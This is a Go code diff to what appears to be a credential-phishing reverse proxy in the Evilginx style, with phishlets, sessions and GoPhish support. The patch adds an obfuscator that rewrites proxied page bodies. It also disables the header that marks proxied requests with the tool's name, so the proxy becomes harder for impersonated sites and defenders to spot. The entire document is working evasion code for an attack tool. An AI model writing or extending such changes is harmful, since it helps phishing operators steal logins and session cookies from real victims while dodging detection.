@@ -70,6 +70,7 @@ type HttpProxy struct {
 	db                *database.Database
 	bl                *Blacklist
 	gophish           *GoPhish
+	ob                *Obfuscator
 	sniListener       net.Listener
 	isRunning         bool
 	sessions          map[string]*Session
@@ -106,7 +107,7 @@ func SetJSONVariable(body []byte, key string, value interface{}) ([]byte, error)
 	return newBody, nil
 }
 
-func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, developer bool) (*HttpProxy, error) {
+func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *database.Database, bl *Blacklist, ob *Obfuscator, developer bool) (*HttpProxy, error) {
 	p := &HttpProxy{
 		Proxy:             goproxy.NewProxyHttpServer(),
 		Server:            nil,
@@ -114,6 +115,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 		cfg:               cfg,
 		db:                db,
 		bl:                bl,
+		ob:                ob,
 		gophish:           NewGoPhish(),
 		isRunning:         false,
 		last_sid:          0,
@@ -466,7 +468,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 						return p.blockRequest(req)
 					}
 				}
-				req.Header.Set(p.getHomeDir(), o_host)
+				//req.Header.Set(p.getHomeDir(), o_host)
 
 				if ps.SessionId != "" {
 					if s, ok := p.sessions[ps.SessionId]; ok {
@@ -656,7 +658,7 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 
 				// check for creds in request body
 				if pl != nil && ps.SessionId != "" {
-					req.Header.Set(p.getHomeDir(), o_host)
+					//req.Header.Set(p.getHomeDir(), o_host)
 					body, err := ioutil.ReadAll(req.Body)
 					if err == nil {
 						req.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
@@ -1178,7 +1180,9 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 					}
 				}
 
-				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(body)))
+				obfuscatedBody := p.ob.obfuscate(body, mime)
+
+				resp.Body = ioutil.NopCloser(bytes.NewBuffer([]byte(obfuscatedBody)))
 			}
 
 			if pl != nil && len(pl.authUrls) > 0 && ps.SessionId != "" {
@@ -1788,9 +1792,11 @@ func (p *HttpProxy) getPhishDomain(hostname string) (string, bool) {
 	return "", false
 }
 
+/*
 func (p *HttpProxy) getHomeDir() string {
 	return strings.Replace(HOME_DIR, ".e", "X-E", 1)
 }
+*/
 
 func (p *HttpProxy) getPhishSub(hostname string) (string, bool) {
 	for site, pl := range p.cfg.phishlets {
